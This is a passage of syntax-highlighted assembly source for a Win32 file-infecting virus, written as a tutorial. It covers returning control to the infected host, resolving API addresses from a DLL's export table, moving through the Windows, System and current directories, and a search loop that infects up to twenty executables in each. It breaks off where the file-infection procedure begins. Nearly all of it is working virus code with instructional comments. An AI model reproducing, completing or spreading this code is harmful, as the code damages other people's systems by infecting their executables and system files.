    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">oldip</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; **</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; **</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectDirectories</span><span class="sc0">                   </span><span class="sc1">; Infect the directories</span><span class="sc0">


    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; **</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">oldip</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; **</span><span class="sc0">

</span><span class="sc5">GetOut</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">; First generation ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitNow</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldip</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Restore old IP</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; Align to memory **EBP</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; And run host</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; As  you  can  see, the returning to the host is very easy! ;;</span><span class="sc0">
</span><span class="sc1">;; You simply retrieve  the  saved value from oldip, you add  ;;</span><span class="sc0">
</span><span class="sc1">;; the image base where the host is loaded and you make a JMP ;;</span><span class="sc0">
</span><span class="sc1">;; to it                                                      ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">ExitNow</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_ExitProcess</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; GetFunctionAddress</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Input parameters:</span><span class="sc0">
</span><span class="sc1">; esi = offset of a zeroe terminated string with the name of the Api.</span><span class="sc0">
</span><span class="sc1">; eax = image base of the dll where the API resides</span><span class="sc0">
</span><span class="sc1">; Returns:</span><span class="sc0">
</span><span class="sc1">; eax = address of desired API</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GetFunctionAddress</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; Pointer to pe header</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">120</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; EBX = Export Address</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">CompareNext</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">CompareName</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CompareNext</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">GetAddress</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CompareName</span><span class="sc0">

</span><span class="sc5">GetAddress</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetFunctionAddress</span><span class="sc0">  </span><span class="sc9">ENDP</span><span class="sc0">




</span><span class="sc1">;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;</span><span class="sc0">
</span><span class="sc1">;@============[ Changing Directories ]============@;</span><span class="sc0">
</span><span class="sc1">;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;</span><span class="sc0">

</span><span class="sc5">InfectDirectories</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">128</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">windir</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_GetWindowsDirectoryA</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">128</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sysdir</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_GetSystemDirectoryA</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crtdir</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">128</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_GetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">windir</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infections</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">       </span><span class="sc1">; ** 3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectCurrentDirectory</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sysdir</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infections</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">       </span><span class="sc1">; ** 3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectCurrentDirectory</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crtdir</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">InfectDirectories</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;</span><span class="sc0">
</span><span class="sc1">;@============[ Finding Files To Infect ]============@;</span><span class="sc0">
</span><span class="sc1">;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;</span><span class="sc0">

</span><span class="sc5">InfectCurrentDirectory</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">search</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Point to search record</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">search</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Point to search record</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Push the address of the search record</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exestr</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Point to file mask</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Push the address of file mask</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_FindFirstFileA</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Find first matching file</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; If no file was found, EAX = 0FFFFFFFFh, otherwise ;;</span><span class="sc0">
</span><span class="sc1">;; EAX = new handle                                  ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Check EAX = -1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NoFilesFound</span><span class="sc0">                        </span><span class="sc1">; No more files ?</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Restore EAX</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Save handle</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.FileName</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; ESI = pointer to filename</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.FileSizeLow</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; ECX = filesize</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; EDI was used because EDI was firstly pointing to  ;;</span><span class="sc0">
</span><span class="sc1">;; the search record structure and now ESI points to ;;</span><span class="sc0">
</span><span class="sc1">;; the file name and ECX holds the file size, so     ;;</span><span class="sc0">
</span><span class="sc1">;; thats what we need for now                        ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectFile</span><span class="sc0">                      </span><span class="sc1">; Infect file</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; If the file was infected correctly the carry flag ;;</span><span class="sc0">
</span><span class="sc1">;; is cleared, otherwise it will be set, it its      ;;</span><span class="sc0">
</span><span class="sc1">;; cleared then we will have to decrease the number  ;;</span><span class="sc0">
</span><span class="sc1">;; of already infected files                         ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">AnotherFile</span><span class="sc0">                     </span><span class="sc1">; Find another file to infect</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infections</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Decrement infection count</span><span class="sc0">

</span><span class="sc5">AnotherFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; Save search record address</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.FileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; Restore search record address</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Restore file handle</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Save the file handle again</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; Push find zone</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Push handle</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_FindNextFileA</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; Find the next matching file</span><span class="sc0">

    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; No more files ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">AllDone</span><span class="sc0">                         </span><span class="sc1">; Finsihed ?</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.FileName</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; ESI = pointer to filename</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.FileSizeLow</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; ECX = filesize</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectFile</span><span class="sc0">                      </span><span class="sc1">; Infect file</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">FailedToInfectFile</span><span class="sc0">                  </span><span class="sc1">; Did we fail to infect ?</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infections</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Decrement infection count</span><span class="sc0">

</span><span class="sc5">FailedToInfectFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">infections</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; Are we done yet ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">AnotherFile</span><span class="sc0">                     </span><span class="sc1">; Infect another file</span><span class="sc0">

</span><span class="sc5">AllDone</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Restore file hadle</span><span class="sc0">

</span><span class="sc5">NoFilesFound</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; Return</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; So what we have done so far is that we have       ;;</span><span class="sc0">
</span><span class="sc1">;; searched for the first matching file and called   ;;</span><span class="sc0">
</span><span class="sc1">;; the infecting procedure, then you can try to      ;;</span><span class="sc0">
</span><span class="sc1">;; locate another file, all until no more files were ;;</span><span class="sc0">
</span><span class="sc1">;; found or the maximum number of infections was     ;;</span><span class="sc0">
</span><span class="sc1">;; reached                                           ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">InfectCurrentDirectory</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;</span><span class="sc0">
</span><span class="sc1">;@============[ Infecting The File ]============@;</span><span class="sc0">
</span><span class="sc1">;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;</span><span class="sc0">

</span><span class="sc5">InfectFile</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">

